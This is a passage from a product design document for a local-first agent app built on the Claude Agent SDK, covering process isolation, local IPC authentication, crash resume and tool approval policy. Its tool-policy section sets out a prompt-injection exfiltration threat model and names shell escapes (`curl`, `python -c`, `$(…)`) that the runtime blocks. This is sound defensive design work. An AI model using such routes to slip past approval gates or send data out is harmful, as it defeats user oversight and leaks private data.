# Homerun — Design Document

*A local-first agent that runs your tasks at home, on your own machine — and
that you control from anywhere.*

**Status:** Draft for review
**Date:** 2026-09-25
**Scope:** v1 architecture and build plan

> **Changes from milestone 0.** The Agent SDK and packaging spike
> ([results](spike-results.md), entries 1–25 of its
> [Design impact](spike-results.md#design-impact)) revised these sections:
> §4 (the shell holds the keychain), §5.1 (process tree, `claude` signature,
> process groups, secrets from the shell), §5.2 (socket path fallback,
> `secrets.set` and `secrets.persist`, the CLI's own token), §5.3 (SQLite store as a
> mirror of a disposable local cache, isolation list: clean `/bin/bash`,
> background tasks off, built-in skills), §5.4 (resume procedure for ambiguous
> calls), §5.5 (Node and `uv` as on-demand components, registries, CPython
> pre-fetch), §5.6 (`defer` with parallel tool calls, idempotent decisions),
> §6 (`runs.claude_pid`, `sdk_transcripts.uuid`), §9.6 (the pairing key is
> stored by the shell), §10.4 (the refresh token is stored by the shell),
> §11 (hybrid signing, entitlements, keychain owned by the shell), §14 (install
> size, components in updates), §16.1 (results per item) and §16.2 (SDK upgrade
> tests).

---

## 1. Purpose

A personal agent platform where an LLM agent takes user instructions and performs
real work on the user's behalf — including on a schedule, without the user
present.

Surfaces:

- **Desktop (macOS + Windows)** — primary. One app that runs the agent (§5.1).
- **Web client** — a remote in the browser. Shares the UI codebase with desktop;
  runs no agent itself (§9.9).
- **iOS** — a full conversational client for the desktop's agent: history,
  chat, questions, approvals (§9.8).

**Core architectural commitment: the agent runs on the user's own machine.**
There is one small hosted backend — a blind relay that carries
encrypted frames to the iOS app and delivers push notifications. It runs no
models and holds no agent state.

**v1 is Claude-only**, built on the Claude Agent SDK (§3.4). Other model families
are a v2 concern.

---

## 2. Product model: two kinds of task

Everything in this design is shaped by the fact that the product has two task
types with opposite requirements.

| | **Session** | **Monitor** |
|---|---|---|
| Example | "Research X, write the report, iterate" | "Watch this and tell me when Y" |
| Trigger | User-initiated | Schedule (cron) |
| Duration | Minutes to hours | Seconds; usually a no-op |
| Needs local files / credentials | Usually yes | Usually no |
| Needs the machine awake | No — user is there | **Yes, that's the point** |
| Model cost per run | High | Should be near zero |
| Failure mode that matters | Crash mid-run loses hours of work | Silently stops running |

These pull in different directions, and most design decisions below are about
serving both without building two systems.

### 2.1 Glossary

| Term | Meaning |
|---|---|
| **Task** | A saved definition: prompt, tools, model, policy, and, for monitors, a schedule and check |
| **Thread** | A conversation. What the user sees as chat history |
| **Run** | One execution: from a trigger (message, schedule, or button) until the agent yields or ends |
| **Step** | One model call, plus the tool calls it makes |
| **Chat** | A thread with no saved task: a quick one-off conversation using default tools and model |

**Relationships:**

| | Session task | Monitor task | Chat |
|---|---|---|---|
| Threads | **Many** (*"New chat"* on the task) | **Exactly one**, for its reports | One thread, no task |
| Runs per thread | Many; one active at a time (§5.7) | One per fire | Many; one active at a time |

A chat can be saved as a session task later ("Save as task"), keeping its
thread.

---

## 3. Key decisions

### 3.1 Local-first execution

The agent runtime lives on the user's machine, inside the desktop app.

**Why:**

- **Local resource access.** Tasks that touch files, repos, dev environments, or
  an authenticated browser session cannot be done from a server. No architecture
  fixes this.
- **Credentials.** A local agent reuses the OS keychain and existing CLI auth
  (`gh`, `az`, `kubectl`) and browser cookies. A server agent requires building
  an OAuth broker and secrets vault per integration — and then *holding* user
  tokens, which is permanent liability.
- **Compute economics.** A two-hour session on our infrastructure is a microVM
  burning money. On the user's machine it is free. At scale this is the
  difference between a viable product and a subsidised one.
- **Abuse surface.** We never run user-directed code on our IPs.

**Accepted cost:** monitors are only as reliable as the machine is awake.
Mitigations in §8, and v1 is upfront about it (§8.4); this is the single largest
compromise in the design.

### 3.2 One minimal backend: blind relay, push, and identity

The runtime owns scheduling, storage, and execution. There is no control plane, no
hosted scheduler, and no agent compute in the cloud.

There is exactly one piece of infrastructure: a **relay + push service**. It
exists because iOS must be reachable over the internet (§9), and because iOS
suspends backgrounded apps — making **APNs push the only reliable way to deliver
an approval request**. APNs requires a server holding a signing key, and that key
cannot ship inside the desktop binary.

The relay is deliberately dumb:

- It forwards **opaque, end-to-end encrypted frames** between paired devices. It
  cannot read task content, prompts, or results.
- It holds no agent state, runs no models, and executes nothing.
- It authenticates users through accounts (§10), but accounts hold identity
  and a device list only. Trust between devices comes from device keypairs,
  which the server cannot forge (§10.5).

**Everything of value still runs locally.** The relay is a pipe with a push
button attached.

### 3.3 Device pinning, not device election

A task is created on a device and runs on that device. Always.

No leader election, no leases, no cross-device sync. If the user has two
machines, they have two independent installs with two independent task lists.
This is the honest v1 model and it is what §12 justifies in detail.

### 3.4 Claude-only in v1, on the Claude Agent SDK

v1 supports **Claude models only**, and the agent loop is the **Claude Agent
SDK** (`@anthropic-ai/claude-agent-sdk`). This is the agent harness behind Claude
Code, packaged as a library.

**Why:** it trades model choice for a large amount of finished, battle-tested
agent machinery that we would otherwise build and debug ourselves:

| Need | Provided by the SDK |
|---|---|
| Agent loop with tools | Built in, the same loop as Claude Code |
| File, shell, search, and web tools | Built in: `Read`, `Write`, `Edit`, `Bash`, `Glob`, `Grep`, `WebFetch`, `WebSearch` |
| Context-window management | Automatic compaction of long conversations |
| Approvals | Permission rules, a `canUseTool` callback, and `PreToolUse` hooks |
| Clarifying questions | Built-in `AskUserQuestion` tool |
| Long waits without holding a process | The `defer` hook decision: stop now, resume later |
| Durable conversation history | Sessions with resume and fork, and a pluggable `sessionStore` |
| MCP integrations | First-class, including in-process custom tools |
| Cost control | `maxBudgetUsd`, per-run cost reporting, `fallbackModel` |
| Subtasks | Subagents |

**What we give up, knowingly:**

- **Model choice.** No GPT, Gemini, or local models in v1. This reverses the
  earlier multi-provider requirement. It was reversed on purpose.
- **Vendor coupling.** The agent's behaviour changes when the SDK updates,
  because the SDK version tracks the bundled Claude Code version. Pin SDK
  versions and upgrade deliberately, with an eval suite (§16).
- **Less control over the loop.** We steer it through hooks, permission rules,
  and the session store rather than owning each step.

**Terms that come with it:**

- Users authenticate with an **Anthropic API key**, or through Amazon Bedrock,
  Google Vertex AI, or Microsoft Foundry. Anthropic does not allow third-party
  products to offer claude.ai login or subscription rate limits.
- Use is governed by Anthropic's Commercial Terms, which permit building products
  for our own end users.
- **Branding.** We may say *"Homerun, powered by Claude"*. We may not call any
  part of the product "Claude Code", or imitate its visual identity.

**Keeping v2 open.** The runtime talks to the agent through a small internal
interface: `start`, `send`, `interrupt`, `answer`, and an event stream. The Claude
Agent SDK is the one v1 implementation. A multi-model engine (for example, on
the Vercel AI SDK) can be added behind the same interface in v2, without
touching the scheduler, storage, protocol, or clients.

---

## 4. System shape

```
┌──────────────────────────── User's Mac / PC ────────────────────────────┐
│                                                                         │
│  ┌──────────────────── Homerun.app — one install ────────────────────┐  │
│  │                                                                   │  │
│  │  ┌───────────────┐  spawns and   ┌─────────────────────────────┐  │  │
│  │  │ Shell (Rust)  │──supervises──►│ homerund — runtime process  │  │  │
│  │  │ tray, login   │◄─── socket ──►│ Claude SDK · scheduler      │  │  │
│  │  │ item, updater │ launch token  │ tools · storage · relay     │  │  │
│  │  │ keychain      │ secrets.set   │                             │  │  │
│  │  └───────▲───────┘               └──────────────┬──────────────┘  │  │
│  │          │ Tauri commands                       │                 │  │
│  │  ┌───────┴───────┐ (no socket access)           │                 │  │
│  │  │ Webview UI    │                              │                 │  │
│  │  │ low-privilege │                              │                 │  │
│  │  │ closable      │                              │                 │  │
│  │  └───────────────┘                              │                 │  │
│  └─────────────────────────────────────────────────┼─────────────────┘  │
│                                                    │                    │
│   CLI ◄── same socket · token in ──────────────────┤                    │
│           CLI's own keychain item                  │                    │
│                                                    │                    │
│   SQLite · MCP servers (children) ◄────────────────┘                    │
│                                                                         │
│                          ▲ outbound WSS only                            │
└──────────────────────────┼──────────────────────────────────────────────┘
                           │  (desktop dials out — never listens
                           │   on a public port)
                    ┌──────▼───────────────┐
                    │   Relay + Push       │   blind pipe
                    │   • frame forwarding │   • sees ciphertext only
                    │   • APNs push        │   • identity only
                    └──────▲───────────────┘
                           │
            ┌──────────────┴──────────────┐
      ┌─────┴──────┐               ┌──────┴──────┐
      │  iOS app   │               │ Web client  │
      │ full chat  │               │ remote,     │
      │ client     │               │ reduced     │
      └────────────┘               │ authority   │
                                   └─────────────┘
```

One desktop install, three hosted-or-remote surfaces:

1. **Homerun.app** — the single desktop application. Inside it:
   - **Shell** (Rust, Tauri) — menu-bar / tray presence, login item, window
     management, updater, and the keychain (§11). Spawns and supervises the
     runtime, and hands it secrets.
   - **`homerund`** — the runtime, a child process of the app. Owns everything
     that matters: scheduling, storage, tools, the agent loop, and the relay
     connection.
   - **Webview UI** — the shared React app. Low-privilege and closable.
2. **CLI** — talks to the same runtime socket; for development and power users.
3. **iOS app** — a full conversational client (§9.8).
4. **Web client** — a remote in the browser, with reduced authority (§9.9).
5. **Relay + push + identity** — the only hosted backend. Blind to content; holds
   accounts and device lists, nothing else.

---

## 5. The runtime (`homerund`)

### 5.1 Process model: one app, runtime in a child process

There is **no separately installed daemon**. The user installs one app. The
agent runtime runs inside that app as a supervised child process.

**Why not a separate background daemon (LaunchAgent / logon task)?** Its one
real advantage is running while the app is quit. That does not justify the cost:
a second binary to sign and ship, UI↔daemon version skew across independently
updated components, a separate entry in Login Items and in privacy settings, and
a background process users did not knowingly install. "Quit means stop" is also
what users expect.

**Why not run the agent inside the webview?** Four reasons, any one sufficient:

1. **Updates would kill runs.** Tier 1 updates (§14) reload the web bundle. A
   runtime in the webview would lose every in-flight run on each UI update.
2. **Closed windows must cost nothing.** We destroy the webview when the window
   closes, to free its memory. Hidden webviews are also throttled by the OS.
3. **Capabilities.** A webview cannot spawn MCP servers or hold power assertions.
   Every such call would be bridged into native code anyway.
4. **Privilege separation.** The UI renders model output — markdown, links,
   content derived from web pages the agent read. That is exactly where an
   injection lands. If the webview were the runtime, a rendering bug would be
   full tool and filesystem access. Kept separate, a compromised webview can
   only send the same requests the UI can, and the runtime still enforces
   approvals.

**Why not write the runtime in Rust inside the shell?** The Claude Agent SDK
and the MCP ecosystem are TypeScript-first, and `packages/core` types are shared
with every client. The runtime is TypeScript compiled to a single binary with
`bun build --compile`, bundled inside the app, and launched by the shell as a
Tauri sidecar.

**Process tree.** The Agent SDK works by driving a bundled native Claude Code
binary as a subprocess, so an active run adds one process:

```
Homerun.app (shell)         owns the keychain (§11)
└── homerund                runtime: scheduler, storage, relay, protocol
    └── claude              one per active run, started by the Agent SDK,
        │                   in its own process group
        ├── bash            the Bash tool's shell (§5.3)
        └── MCP servers     started per run, as configured; npx / uvx
                            servers use the Node and uv components (§5.5)
```

- The `claude` binary is shipped **inside the app bundle** and passed to the SDK
  through `pathToClaudeCodeExecutable`. It is not extracted to a temporary
  directory at runtime. It **keeps Anthropic's own signature**: the build
  verifies it and never re-signs it (§11).
- Each active run costs a process, so concurrency is capped (§5.3).
- **Each `claude` runs in its own process group**, and the runtime records the
  group in `runs` (§6). Children outlive their supervisors: a runtime killed
  with SIGKILL leaves `claude` running (reparented to launchd) and finishing its
  tool call, and a killed `claude` leaves its tool shell running. macOS does not
  kill the children of a crashed app. So stopping a run kills the whole group,
  and at start the runtime kills any recorded group that is still alive
  **before** the crash-resume check (§5.4).
- **Secrets come from the shell.** The runtime never calls the keychain. The
  shell reads the API key and sends it over the authenticated local channel
  (`secrets.set`, §5.2). The runtime keeps it in memory only and passes it only
  into `claude`'s environment.

**Lifecycle**

| Event | Behaviour |
|---|---|
| Login | App starts hidden in the menu bar / tray (§11). Runtime starts; schedules resume. |
| Window closed | Webview destroyed. App, runtime, runs, and schedules continue. |
| Quit | If runs are active or schedules enabled, confirm: *"2 runs will pause and 5 schedules won't fire until Homerun is running."* Runtime checkpoints and exits cleanly. |
| Tier 1 (web) update | Only the webview reloads. Runtime unaffected. |
| Tier 2 (app) update | Deferred while runs are active unless the user chooses otherwise; runtime checkpoints first and resumes afterwards (§5.4). |
| Runtime crash | Shell restarts it with backoff; orphaned `claude` process groups are killed, then runs resume from checkpoint (§5.4). |
| Shell crash | Runtime detects parent exit (its stdin pipe closes), checkpoints, and exits. Next launch resumes. |

- **macOS:** menu-bar app; the Dock icon is shown only while a window is open.
  Permissions (Full Disk Access, Automation) attach to **Homerun.app** as the
  responsible process, so users see one entry in System Settings rather than an
  unfamiliar helper binary.
- **Windows:** tray app, per-user install, started at login (§11).

**Single-instance enforcement:** the shell refuses a second app instance, and
the runtime holds an exclusive lock on its IPC socket (macOS) or a named mutex
(Windows). This — not leases — prevents double execution on one machine.

**Escape hatch, not v1:** the runtime speaks the same IPC protocol regardless of
who launched it. A future "keep running when Homerun is quit" setting — or a
headless `homerun serve` for servers — can register the same binary as a
LaunchAgent without code changes.

### 5.2 Transport

| Consumer | Transport |
|---|---|
| Desktop UI | Webview → Tauri commands → Rust shell → local socket. The webview never touches the socket. |
| CLI | Local socket, with a token in the CLI's own keychain item |
| iOS, anywhere | Outbound WSS to the relay; E2E encrypted frames (§9.4) |

The runtime **never opens an inbound listener reachable from the internet** (§9.2).

#### Local connection security

The local socket accepts connections from **any process running as the user**:
malware, a malicious npm `postinstall` script, or another app. File permissions
do not stop same-user processes. Every local connection therefore authenticates.

- **Socket placement.** A Unix socket in a `0700` directory inside the app's
  support folder on macOS; on Windows, a named pipe whose ACL admits only the
  current user. This stops other users on the machine, not same-user processes.
  A Unix socket path is limited to 104 bytes (`sun_path`). If
  `<support folder>/run/homerund.sock` would exceed it, the runtime falls back
  to a short per-user path such as `$TMPDIR/hr-<uid>/homerund.sock` (directory
  `0700`), and fails loudly if that is too long as well.
- **The shell's launch token.** When the shell spawns the runtime, it generates
  a random 256-bit token and passes it over the runtime's stdin, never through
  arguments or environment variables, which other processes can read. The shell
  presents it on connect. The token is regenerated on every launch and never
  written to disk.
- **Secrets travel over the shell's connection.** The shell owns the keychain
  (§11). At startup, and whenever a secret changes, it sends `secrets.set` (or
  `secrets.clear`) on its authenticated connection. The runtime accepts these
  only from the shell's launch-token connection, never from the CLI or from
  forwarded webview calls. It holds secrets in memory only and never writes
  them to disk or logs. The shell runs whenever the runtime does (§5.1), so the
  key is normally present. A headless runtime (the escape hatch in §5.1) has no
  shell; there, runs that need the key wait in `waiting_input` with *"Open
  Homerun to unlock"*.
- **The runtime writes secrets back through the shell.** Some secrets are
  created or changed by the runtime: the device keypair (§9.6) and rotated
  refresh tokens (§10.4). It sends them to the shell with a `secrets.persist`
  request, allowed only on the shell's connection. The shell stores the value
  in the keychain and acknowledges. Until the acknowledgement arrives, the value
  is *pending*:
  - The runtime keeps a pending value in memory and uses it. It retries
    `secrets.persist` when the shell reconnects. A `secrets.set` from the shell
    never overwrites a newer pending value.
  - If the runtime restarts before a pending refresh token is persisted, the
    shell still holds the old token, which rotation has invalidated. The
    runtime then falls back to a fresh sign-in (§10.4), and remote access is
    paused until the user signs in again.
  - A device keypair is never used for pairing until the shell has confirmed
    storing it.
- **The webview has no socket access.** It calls Tauri commands; the shell
  forwards an allowlisted set of methods to the runtime. A compromised webview
  can do only what the UI can do, and approvals are still enforced by the
  runtime.
- **The CLI is approved once.** On first use, `homerun` asks the app for
  access. The app shows *"Allow the Homerun CLI to control your agents?"*. On
  approval, the runtime issues a CLI token. The **CLI** stores it in its own
  keychain item, where macOS ties access to the CLI's code signature. The
  runtime keeps only what it needs to check the token, and never touches the
  keychain. The token can be revoked in settings.
- **Unauthenticated connections** get nothing: they are closed after the
  handshake times out.

**Threat model, stated plainly.** Malware running as the user can already read
the user's files, so protecting confidentiality against it is out of scope. The
goal is narrower: such malware **must not be able to silently drive the agent
or approve its actions**. Approving the CLI and answering approval requests
always happen in UI the user can see.

Protocol: JSON-RPC style request/response plus a server-push event stream.
Versioned handshake on connect. The web UI (Tier 1) and the runtime (Tier 2)
update independently and *will* mismatch; on incompatibility the UI falls back
to its bundled baseline rather than misbehaving. Remote clients (iOS, web)
negotiate the same way.

### 5.3 Agent loop

The loop is the **Claude Agent SDK's** (§3.4). `homerund` wraps each run in one
SDK `query()` and translates between the SDK and Homerun:

| Homerun concept | SDK mechanism |
|---|---|
| Streamed replies | `includePartialMessages` → `message.delta`, which clients see live and which is never persisted |
| Chat history for clients | Assistant and user messages → `message.final` in `thread_events` |
| Model-facing transcript | A `sessionStore` adapter writing to SQLite (§6), with `sessionStoreFlush: "eager"`. `claude` writes its local JSONL first and the SDK mirrors each entry to the store. The local copy is a disposable cache (below); resume needs only SQLite |
| Follow-up message on an idle thread | A new `query()` with `resume: <sdk_session_id>` |
| Message sent during a run | Pushed into the query's streaming input, and seen by the agent after its current step (§5.7) |
| Stop | `interrupt()`, or abort the query's controller; then kill the run's process group (§5.1) |
| Approvals and questions | A `PreToolUse` hook plus `canUseTool` → `input_requests` (§5.6) |
| Budgets | `maxBudgetUsd` per run; the result's `total_cost_usd` is summed per task and globally |
| Provider outage | SDK retries, plus `fallbackModel` (for example, Opus → Sonnet) |

**Isolation from the user's own Claude Code.** Many target users already run
Claude Code. By default the SDK loads `~/.claude` settings, skills, hooks, and
MCP servers. A user's personal hook could then execute inside a Homerun run.
Every `query()` therefore sets:
- `settingSources: []`;
- `CLAUDE_CONFIG_DIR` pointing at a Homerun-private directory. It is a cache,
  not a store: the transcripts `claude` writes under its `projects/` directory
  are deleted after each run. Every resume also creates a temporary config
  directory, which is orphaned if the process is killed, so stale ones are
  swept at runtime start;
- an explicit list of tools and MCP servers built from the task spec, with
  `strictMcpConfig`. (In the spike, a run without these isolation settings
  loaded every default source.) Built-in skills and slash commands are still
  listed to the model even with `skills: []`. The tool list, which never
  includes `Skill`, is what keeps them inert;
- `CLAUDE_CODE_DISABLE_BACKGROUND_TASKS=1` in `claude`'s environment. Otherwise
  the model can run a command with `run_in_background` (a real model did), or
  `claude` can move a long command to the background itself. The tool call
  then returns at once, and a crash leaves an orphaned process doing the work
  but no ambiguous call to detect (§5.4). If background tasks are wanted later,
  they need their own lifecycle in `runs`;
- **a clean shell for the `Bash` tool.** By default `claude` runs Bash commands
  in the user's login shell with their profile sourced. That leaks the user's
  environment, aliases and secrets into runs, adds startup time and 45–80 MiB
  per run, and makes runs behave differently per user. The runtime sets
  `SHELL=/bin/bash`, points the tool shell's `HOME` at a Homerun-owned directory
  that holds an empty `.bash_profile` and `.bashrc`, and sets `BASH_ENV` to
  empty. The user's real home directory is passed in a separate variable, for
  tools that need to find project files. A **per-task opt-in**, *"Use my shell
  environment"*, runs with the user's `$SHELL` and real `HOME`. The UI labels it
  clearly, because it also loads the user's aliases, `PATH` and profile secrets.

Nothing is inherited implicitly. Milestone 0 verified this on the real API
([item 1](spike-results.md#1-isolation-from-the-developers-claude)).

**Concurrency.** Each active run is a `claude` process, with its own memory and
a share of the API rate limit.

| | Sessions | Monitors |
|---|---|---|
| Concurrent runs (default, adjustable) | **3** | **2** |
| When full | Queued in order; the UI shows *"Queued — 2 runs ahead"* | Queued. A fire that waits past its next scheduled fire is merged into it (`run_once` semantics) |

- The limits are separate, so ten monitors firing at 9:00 cannot starve a
  session, and a long session cannot starve monitors.
- **Runs in `waiting_input` hold no slot.** They are deferred (§5.6), with no
  process. A slot is claimed again when the answer arrives.
- Rule-based monitor checks (§8.3) make no model call and start no `claude`
  process, so they bypass the monitor limit. Only the act step queues.

**Failures and retries.**

- **Model API errors** (429, 5xx, overloaded) are retried inside the SDK. After
  that, `fallbackModel` applies. While retrying, the run shows *"Waiting for
  Claude — retrying"*, never a silent stall.
- **Monitor runs that fail** are retried **twice**, with exponential backoff
  (1 minute, then 5 minutes). If both retries fail, the monitor notifies the
  user (§8.2) and waits for its next scheduled fire. A monitor that fails three
  scheduled fires in a row is paused, and the user is told why.
- **Session runs that fail** are not retried automatically: the user is
  present, and the thread offers *Retry*.
- **Rate limits** are shared across runs: when the API reports a rate limit, the
  runtime holds queued runs until the reset time the API provides, instead of
  starting runs that will fail.

Each run appends events to its thread's log (§6): `user.message`,
`message.final`, `tool.call`, `tool.result`, `input.requested`,
`input.resolved`, `run.end`, `run.cancelled`. `message.delta` is streamed only.

### 5.4 Crash resume

The SDK transcript, persisted through our `sessionStore` after every step, is
the only model-facing state. Resume reloads it and continues. `thread_events` is
derived history for people, never fed back to the model, so there is one source
of truth for each purpose.

A partial model response — deltas streamed but no `message.final` — is
discarded on resume, and the request is re-issued.

**The hard case is crashing mid-tool-call** — we don't know whether the side
effect happened. Handled at tool granularity:

1. Record `tool.call` with a `tool_call_id` **before** dispatch.
2. Record `tool.result` **after** completion.
3. On resume, a call with no matching result is *ambiguous*.

Resolution depends on a property each tool declares:

- `read` / `idempotent` → resume, telling the model the call was interrupted and
  may be retried.
- everything else → **pause the run and ask the user.**

This puts idempotency where it actually belongs — on the tool — rather than on
the task as a whole.

**With the Agent SDK** (proven in milestone 0 on the real API, Haiku and
Sonnet 5:
[item 4](spike-results.md#4-kill-mid-tool-call-detect-the-ambiguous-call-inject-the-users-decision)):
- The SDK's transcript, persisted through our `sessionStore`, is what `resume`
  reloads.
- `tool.call` is written by whichever of `PreToolUse` and `canUseTool` runs
  first, idempotently on the `tool_use_id`, because `PreToolUse` is sometimes
  skipped on resume. `tool.result` is written by `PostToolUse` and
  `PostToolUseFailure`. So ambiguous calls remain detectable.
- **A blind resume repeats the side effect.** When `claude` resumes a
  transcript that ends in a `tool_use` with no result, it writes its own result
  (*"[Request interrupted by user for tool use]"*) and persists it, and the
  model then usually runs the call again. So the runtime never resumes an
  ambiguous run before the question is settled:
  1. At runtime start, after killing orphaned process groups (§5.1) and before
     resuming any run, find ambiguous calls from `thread_events` (`tool.call`
     with no `tool.result`), cross-checked against `sdk_transcripts`.
  2. `read` / `idempotent` tools: resume with a message saying the call was
     interrupted and may be retried.
  3. Other tools: keep the run in `waiting_input` **without resuming**, and ask
     the user *"Did this happen?"* (§5.6).
  4. **Apply the answer by injection (primary path):** append a `tool_result`
     for that `tool_use_id` to `sdk_transcripts`: *"completed; do not re-run"*
     or *"did not run"*. **Fallback, truncation:** resume with
     `resumeSessionAt` set to the entry before the call, plus a message stating
     the outcome.
  5. **Always resume with an explicit continuation message,** for example
     *"The interrupted command completed. Continue the task."* Never a bare
     "continue": after an injected result, a real model asked what to continue.
- The injected entry's format is internal to the SDK, so the SDK upgrade gate
  tests it (§16.2).
- Background tasks are disabled (§5.3): a backgrounded command returns at once
  and would leave no ambiguous call to detect.

### 5.5 Tools

- **SDK built-ins:** `Read`, `Write`, `Edit`, `Glob`, `Grep`, `Bash`,
  `WebFetch`, `WebSearch`, and `AskUserQuestion` (§5.6). A task's spec lists
  which are available.
- **Homerun tools** — for example, notifications, monitor state (§8.3), and the
  scheduler. These are implemented in-process with the SDK's
  `createSdkMcpServer`, so there is no extra process.
- **MCP** for integrations: stdio servers started per run, plus remote HTTP
  servers. Users can bring their own.

#### Integrations for every user, not just developers

v1 targets **both developers and general users**. Most published MCP servers are
started with `npx` (Node.js) or `uvx` (Python), which most people don't have
installed. So Homerun provides the toolchain itself:

- **Node.js LTS (with npm) as an on-demand component**, used for every `npx`
  server. The user's own Node, if any, is never used, so integrations behave the
  same on every machine.
- **`uv` as an on-demand component**, used for every `uvx` server. `uv`
  downloads a managed Python (about 25 MB) on first use, so no Python ships in
  the installer. **Decision:** Homerun starts that download in the background as
  soon as the `uv` component is installed, so the first `uvx` server does not
  wait for it.
- **Configurable registries.** Managed networks may block the public npm and
  PyPI registries. Per-install settings for the npm registry and the `uv` index
  (`npm_config_registry`, `UV_INDEX_URL`) are passed only to Homerun's `npx`
  and `uvx`.
- **Private install locations.** Packages go into Homerun's own support
  directory, never global locations, so they neither affect nor depend on the
  user's development environment.
- **Remote MCP servers are preferred where they exist.** A hosted MCP endpoint
  with OAuth needs no local runtime at all, and many services now offer one.

**Supply-chain controls.** Installing an MCP server means running third-party
code on the user's machine.
- The integration catalog pins every package to an exact version, with a
  lockfile.
- The install dialog shows the package name, version, publisher, and what the
  server can access.
- Upgrades are explicit, never automatic.
- Custom servers (any npm or PyPI package) are allowed, behind a clear warning.
- Tools from any third-party server start as *requires approval* (tool policy,
  below).

**Toolchain components.** Node and `uv` are not in the app bundle. They are
downloaded the first time the user installs a third-party MCP server that needs
`npx` or `uvx`. This saves 58 MB of download and 167 MB on disk for users who
never add one, and keeps them out of app updates (§14). The MCP install dialog
shows a one-time *"Downloading tools (about 60 MB)"* step.

- **Published:** for each architecture and version, a `.tar.zst` of the
  binaries, re-signed with our Developer ID (§11) and notarized (submitted as a
  zip, because a bare Mach-O cannot be stapled). A **component manifest** lists
  the name, version, URL, the archive's `sha256`, and the `CDHash` of every
  Mach-O. It is signed with the Tauri updater's ed25519 key (minisign format),
  whose public key is compiled into our signed binaries.
- **Installed by the runtime:** check the manifest's signature; download the
  archive and check its `sha256`; extract it into a staging directory; verify
  every Mach-O against our Team ID and its manifest `CDHash`
  (`codesign --verify --strict -R '=anchor apple generic and
  certificate leaf[subject.OU] = "<TEAMID>" and cdhash H"<cdhash>"'`, or
  `SecStaticCodeCheckValidity` with that requirement); remove any
  `com.apple.quarantine` attribute; then rename the directory atomically to
  `~/Library/Application Support/dev.homerun.app/components/<name>/<version>/`,
  owned by the user with mode `0700`. The previous version is kept until the new
  one passes a smoke test (`node -e`, `uv --version`).
- **Launched** only by the hardened runtime, by absolute path. Never on the
  user's `PATH`.
- **Re-verified on every runtime start** (`sha256` and `codesign`, about 0.4 s).
  This is required, not optional: in milestone 0, a tampered `node` and a
  tampered `uv` both still launched, because the kernel checks code pages
  lazily, and only the pre-launch check caught them. Homerun does not set
  `LSFileQuarantineEnabled`, so files it writes are not quarantined. The
  explicit removal covers a proxy or MDM tool that adds the attribute: in the
  spike, Gatekeeper killed quarantined, non-notarized binaries at launch.
- **Entitlements:** Node needs the JIT entitlement and
  `disable-library-validation`, to load native add-ons from npm packages. `uv`
  needs none (§11).

Every tool is classified: `read` | `write` | `destructive` | `network`. A task
declares an allowlist; anything outside it requires approval (§13).

#### Tool policy

**Classification of built-ins.**

| Tool | Class | Notes |
|---|---|---|
| `Read`, `Glob`, `Grep` | `read` | Within the task's declared roots; the hard denylist always applies (§13) |
| `Write`, `Edit` | `write` | Within declared roots |
| `WebFetch`, `WebSearch` | `network` | Also a source of untrusted content (below) |
| `Bash` | **`destructive`** | Unless the command matches an allowlisted pattern |
| Homerun tools | Declared by us | Reviewed in code, like any other built-in |

**Third-party MCP tools require approval until the user trusts them.**

- Any tool from an MCP server we did not write starts as *requires approval* on
  every call.
- In the approval prompt, the user can choose *"Trust this tool"* and assign it
  a class. This is per task, and can be revoked in the task's settings.
- MCP tool annotations (`readOnlyHint`, `destructiveHint`) come from the server,
  and the MCP specification says clients must treat them as untrusted. **They may
  only tighten a classification, never loosen it.**
- Third-party MCP output is treated as untrusted content by default.

**`Bash` is destructive, except allowlisted patterns.** A path check cannot
constrain a shell: `python -c`, `curl`, and `$(…)` all reach outside it.

- Tasks allowlist command patterns (for example `git status`, `npm test`,
  `ls *`), each with a declared class.
- A command containing shell metacharacters — `;`, `&&`, `||`, `|`, `$(…)`,
  backticks, or redirection — never matches a pattern. It requires approval
  whatever its prefix.
- **Monitors cannot use `Bash`.** Unattended scheduled runs have it removed from
  their tool list entirely (`disallowedTools`), not merely gated.

**Untrusted content taints the run.** Prompt injection needs three things:
untrusted content in context, private data the agent can read, and a way to
send data out. The taint rule cuts the last link.

- **Untrusted sources:** `WebFetch`, `WebSearch`, browser tools, third-party MCP
  output, and any file read outside the task's declared roots.
- Once a run has ingested untrusted content, the run is **tainted** until it
  ends.
- In a tainted run, **any network request to a domain outside the task's egress
  allowlist requires approval.** The prompt shows the full URL, including the
  query string, because that is where exfiltrated data hides.
- Research tasks would prompt constantly. So a task may choose **open egress**,
  which disables the taint rule — but only if the task has no private data to
  leak: no declared file roots, and no trusted MCP tools that read private data.
  Private data or open egress: a task may have one, not both.

**Enforcement.** Every rule above runs in the runtime's `PreToolUse` hook, which
the SDK calls before every tool call whatever the permission mode. The hard
denylist is additionally expressed as SDK deny rules, as a second layer.

### 5.6 Input requests: approvals and questions

The agent pauses for the user in two ways, handled by one mechanism:

| Kind | Raised by | User sees |
|---|---|---|
| **Approval** | The runtime, when a tool call is outside the task's allowlist | The exact tool and arguments; Allow / Deny / Always allow |
| **Question** | The agent, via the SDK's `AskUserQuestion` tool | A prompt, with single- or multi-select choices, and optionally a freeform answer |

Both create an `input_requests` row, set the run to `waiting_input`, append an
`input.requested` event, and send a push notification (§9.7).

**Short waits and long waits.** Both arrive through the SDK's `canUseTool`
callback, which can simply stay pending.
- **Short waits:** the user is present, and the `claude` process stays alive.
- **Long waits:** if there's no answer within a grace period (default two
  minutes), the `PreToolUse` hook returns the SDK's **`defer`** decision. The
  process exits and the run stays in `waiting_input`. When the answer arrives,
  the runtime resumes the session from the `sessionStore` and supplies the
  decision.
  - **Supplying the decision.** On resume, `PreToolUse` may not fire again for
    the deferred call, and `canUseTool` may be called twice. So the stored
    decision is applied in both, idempotently, keyed by `tool_use_id`.
    `canUseTool` never allows a call just because it was asked.
  - Resuming a deferred call needs no new message: an empty input stream works.
    Resuming after an injected tool result (§5.4) always sends a continuation
    message.
- **Never defer a parallel batch.** The model may put several tool calls in one
  message, and parallel tool use cannot be turned off: the SDK has no
  `disable_parallel_tool_use` passthrough, and
  `CLAUDE_CODE_MAX_TOOL_USE_CONCURRENCY` only makes execution sequential. If
  every call in a batch is deferred, the result names only one, and on resume
  the others are gone from the model's context. So:
  - The rule is **stateful per API message**. The first gated call in a message
    defers. Every later gated call from the same message is denied with *"Not
    run; re-issue after the pending approval"*. The SDK streams each call of a
    batch as its own entry and runs `PreToolUse` before the next one has
    streamed, so the runtime cannot know in advance whether more will follow.
  - Only the deferred call gets an `input_requests` row. After the answer, the
    model re-issues the denied calls as new calls, and each goes through the
